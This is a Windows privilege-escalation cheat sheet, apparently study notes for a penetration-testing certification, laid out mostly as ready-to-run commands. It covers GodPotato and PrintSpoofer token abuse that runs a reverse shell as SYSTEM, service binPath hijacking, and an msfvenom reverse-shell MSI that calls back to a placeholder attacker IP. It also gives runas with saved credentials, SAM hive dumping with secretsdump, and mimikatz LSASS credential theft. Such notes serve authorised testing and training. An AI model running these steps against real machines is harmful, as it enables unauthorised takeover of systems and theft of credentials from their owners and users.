# Windows Privilege Escalation

> Goal: reach **`NT AUTHORITY\SYSTEM`** or a local Administrator. Enumerate first (automated + manual), then match a finding to a technique.

## Automated enumeration

```powershell
# WinPEAS (transfer first)
.\winPEASx64.exe

# PowerUp (PowerShell)
powershell -ep bypass
. .\PowerUp.ps1 ; Invoke-AllChecks

# Seatbelt, SharpUp are alternatives
```

## Manual enumeration (essentials)

```cmd
whoami /all                      :: user, groups, and PRIVILEGES (key!)
whoami /priv
systeminfo                       :: OS, build, hotfixes → kernel exploit matching
hostname
net user                         :: local users
net localgroup administrators
ipconfig /all ; route print ; arp -a
netstat -ano                     :: internal-only listening ports
tasklist /svc                    :: running services
```
```powershell
Get-LocalUser ; Get-LocalGroupMember Administrators
Get-Process
# search for creds
findstr /si password *.txt *.ini *.config *.xml
Get-ChildItem -Recurse -Include *.kdbx,*.config,unattend.xml,web.config 2>$null
```

---

## Top escalation vectors

### 1. Token privileges (`whoami /priv`) — the exam favorite
If you have any of these on a service/web account, you can usually get SYSTEM:

| Privilege | Exploit |
|---|---|
| `SeImpersonatePrivilege` | **Potato attacks** — PrintSpoofer / GodPotato / JuicyPotatoNG |
| `SeAssignPrimaryToken` | Potato attacks |
| `SeBackupPrivilege` | Read SAM/SYSTEM or NTDS.dit → dump hashes |
| `SeRestorePrivilege` | Overwrite protected files / service binaries |
| `SeTakeOwnership` | Take ownership of a privileged file |
| `SeDebugPrivilege` | Dump LSASS / inject into a SYSTEM process |
| `SeLoadDriver` | Load a vulnerable driver |

```cmd
:: SeImpersonate → SYSTEM
PrintSpoofer64.exe -i -c cmd
GodPotato -cmd "cmd /c whoami"
GodPotato -cmd "C:\Windows\Temp\rev.exe"     :: run your reverse shell as SYSTEM
```

### 2. Service misconfigurations
```powershell
# Unquoted service paths (space in path + unquoted → drop exe in the gap)
wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\"
# Weak service binary permissions (you can overwrite the exe)
# Weak service permissions (you can change binPath)
sc qc <service>
sc config <service> binPath= "C:\Windows\Temp\rev.exe"
sc stop <service> & sc start <service>
# PowerUp finds all of these automatically:
Invoke-AllChecks    # look for "CanRestart: True" services
```
Unquoted path example: `C:\Program Files\My App\svc.exe` → drop `C:\Program.exe` or `C:\Program Files\My.exe` (where writable).

### 3. AlwaysInstallElevated (MSI as SYSTEM)
```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
:: both = 0x1 →
msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f msi -o evil.msi
msiexec /quiet /qn /i evil.msi
```

### 4. Stored credentials
```cmd
:: Saved creds
cmdkey /list
runas /savecred /user:ADMIN "C:\Windows\Temp\rev.exe"
:: Registry autologon
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
:: Unattend / sysprep files
type C:\Windows\Panther\Unattend.xml
:: SAM + SYSTEM hive copies (then secretsdump offline)
```
```powershell
# search everywhere
findstr /si password *.xml *.ini *.txt *.config 2>nul
gci -Recurse -File -Include *.config,*.xml,*.txt | Select-String password 2>$null
```

### 5. Scheduled tasks
```powershell
schtasks /query /fo LIST /v | findstr /i "TaskName Run Author"
Get-ScheduledTask | ? {$_.State -eq "Ready"}
# task runs a writable script/binary as a privileged user → replace it
```

### 6. Registry / DLL hijacking, PATH issues
- Writable service registry key → change `ImagePath`.
- Missing DLL loaded by a privileged process from a writable dir → drop your DLL.

### 7. Kernel exploits (match `systeminfo` build + hotfixes)
```cmd
:: Use Windows-Exploit-Suggester / WES-NG offline against systeminfo output
wes.py systeminfo.txt
:: classics: PrintNightmare, HiveNightmare/SeriousSAM, older MS16-032 etc.
```

### 8. Dump credentials once elevated / for lateral movement
```cmd
:: local hashes (from SYSTEM)
reg save HKLM\SAM sam.save & reg save HKLM\SYSTEM system.save
:: offline on attacker:
impacket-secretsdump -sam sam.save -system system.save LOCAL
:: LSASS dump → mimikatz / pypykatz
mimikatz # privilege::debug ; sekurlsa::logonpasswords
```

---

## Quick decision flow

1. `whoami /priv` → SeImpersonate/SeBackup/etc. → potato / hive dump.
2. `Invoke-AllChecks` (PowerUp) → unquoted paths, weak service perms, AlwaysInstallElevated.
3. `cmdkey /list`, Unattend.xml, registry autologon → stored creds → `runas`.
4. Scheduled tasks / writable service binaries.
5. `systeminfo` → WES-NG → kernel exploit matched to build.

Post-SYSTEM: `proof.txt` + **screenshot with `ipconfig`**, dump SAM/LSASS, harvest domain creds for [AD](../06-active-directory/active-directory.md) and [pivoting](../07-pivoting/pivoting-tunneling.md).
